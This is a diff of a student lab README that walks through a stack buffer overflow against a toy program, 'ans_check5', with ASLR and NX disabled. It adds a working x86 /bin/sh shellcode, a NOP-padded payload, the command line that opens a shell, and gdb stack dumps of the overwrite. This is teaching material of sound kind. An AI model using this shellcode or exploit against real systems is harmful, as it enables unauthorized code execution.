@@ -1,4 +1,4 @@
-# Lab3 - Simple buffer overflow example
+# Lab3 - Buffer overflow attack(turn off ASLR, turn off NX)
 
 ## What are we going to do?
 This example shows that after calling strcpy function, just exiting the program not returning to the point it was called.
@@ -8,6 +8,8 @@ To do that, we need to overwrite the return address exploit the strcpy function.
 1. Set an address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
 2. Find where the strcpy return address is.(It's a brute force method)
 3. And then, run the c program with a parameter containing the address where you want to jump.(We are going to use the address from the Step1)
+4. Make a payload which include the execution of shell code!!
+5. Place the payload as a parameter of the 'ans_check5'.
 
 ## Steps in detail
 + Preparation. Compile the c program below like this. 
@@ -47,11 +49,12 @@ Segmentation fault
 ```
 
 + Step3. Run like below. Python code will create meaning-less characters followed by exit return address. That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
+  + Think about it. Now we know where the return address of strcpy. If we can overwrite return address to a target program address we want to execute, and then we can execute it!
 ```
 ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
 ```
 
-+ Result. * As you can notice, the program exit with special input parameter overwriting the return address 
+  + Result. * As you can notice, the program exit with special input parameter overwriting the return address 
 ```
 [02/10/22]seed@VM:Byeongchan$ ans_check5
 Usage: ans_check5 <answer>
@@ -66,6 +69,58 @@ About to exit!
 [02/10/22]seed@VM:Byeongchan$ ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
 ans_buf is at address 0xbf97bbdc
 [02/10/22]seed@VM:Byeongchan$ 
+```
+
++ Step4. Make a payload. 
+  + ‘PAYLOAD’ = '<Aligned Shellcode>'+<Safe padding>+'<BUFFER_START_ADDRESS>'
+  + Shellcode: It's a execution of /bin/sh and hexacoded.
+  + Safe padding: Need it to reach the return address location
+  + BUFFER_START_ADDRESS: Address of a target program. In this case, the start address of 'Aligned Shellcode'
+  + In this practice, we turn off ASLR so we surely know where it the start address of our overwrite.
+```
+Shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+Safe padding: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+BUFFER_START_ADDRESS: \x6c\xfd\xff\xbf
+``
+
++ Step5. Place the payload as a parameter of the 'ans_check5'.
+
+  + FIRST, I executed on command line and I got another bash shell!!!!
+```
+[02/10/22]seed@VM:Byeongchan$ env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*24 + '\x6c\xfd\xff\xbf'")
+ans_buf is at address 0xbffffd6c
+$ exit
+[02/10/22]seed@VM:Byeongchan$
+```
+ 
+  + SECOND, using gdb, investigate the content of the stack!!
+  + I can see the corrupted stack content filled with the malicious code and \x90s and return address which points to the malicious code!!
+```
+(gdb) x/32xw $esp
+0xbffffd50:	0xbffffd6c	0xbfffff6a	0xbffffd70	0x080482c7
+0xbffffd60:	0x00000000	0xbffffe04	0xb7fba000	0xb7eeed57
+0xbffffd70:	0xffffffff	0x0000002f	0xb7e14dc8	0xb7fd6858
+0xbffffd80:	0x00000001	0x00008000	0xb7fba000	0x00000000
+0xbffffd90:	0x00000002	0x00800000	0xbffffdb8	0x080485cb
+0xbffffda0:	0xbfffff6a	0xbffffe64	0xbffffe70	0x08048651
+0xbffffdb0:	0xb7fba3dc	0xbffffdd0	0x00000000	0xb7e20637
+0xbffffdc0:	0xb7fba000	0xb7fba000	0x00000000	0xb7e20637
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804855b in check_answer (ans=0xbfffff00 "\031")
+    at ans_check5.c:12
+12	  strcpy(ans_buf, ans);
+(gdb) x/32xw $esp
+0xbffffd50:	0xbffffd6c	0xbfffff6a	0xbffffd70	0x080482c7
+0xbffffd60:	0x00000000	0xbffffe04	0xb7fba000	0x6850c031
+0xbffffd70:	0x68732f2f	0x69622f68	0x50e3896e	0x99e18953
+0xbffffd80:	0x80cd0bb0	0x90909090	0x90909090	0x90909090
+0xbffffd90:	0x90909090	0x90909090	0x90909090	0xbffffd6c
+0xbffffda0:	0xbfffff00	0xbffffe64	0xbffffe70	0x08048651
+0xbffffdb0:	0xb7fba3dc	0xbffffdd0	0x00000000	0xb7e20637
+0xbffffdc0:	0xb7fba000	0xb7fba000	0x00000000	0xb7e20637
+(gdb)
 ```
 
 # ans_check5.c
